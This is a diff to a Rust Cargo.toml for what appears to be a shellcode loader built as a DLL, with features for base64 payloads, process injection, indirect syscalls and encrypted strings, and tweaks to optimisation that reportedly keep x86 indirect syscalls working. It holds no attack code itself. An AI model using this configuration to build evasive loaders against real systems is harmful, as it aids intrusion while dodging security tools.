@@ -4,7 +4,7 @@ version = "0.1.0"
 edition = "2021"
 
 [lib]
-name = "incrustdll"
+name = "incrustlib"
 path = "src/lib.rs"
 crate-type = ["cdylib"]
 
@@ -20,7 +20,7 @@ litcrypt = "0.3.0"
 rand = "0.8.5"
 
 [features]
-default = ["payload_b64", "inject_self", "syscall_indirect"]
+#default = ["payload_b64", "inject_self", "syscall_indirect"]
 no_console = []
 regsvr = []
 xll = []
@@ -36,7 +36,8 @@ inject_proc_name = []
 
 [profile.release]
 strip = true  # Automatically strip symbols from the binary.
-opt-level = "z"  # Optimize for size.
+#opt-level = "z"  # Optimize for size. 
+opt-level = 1 # more optimizations breaks x86 indirect syscall
 lto = true
-codegen-units = 1
+#codegen-units = 1 # enable this breaks x86 indirect syscall
 panic = "abort"
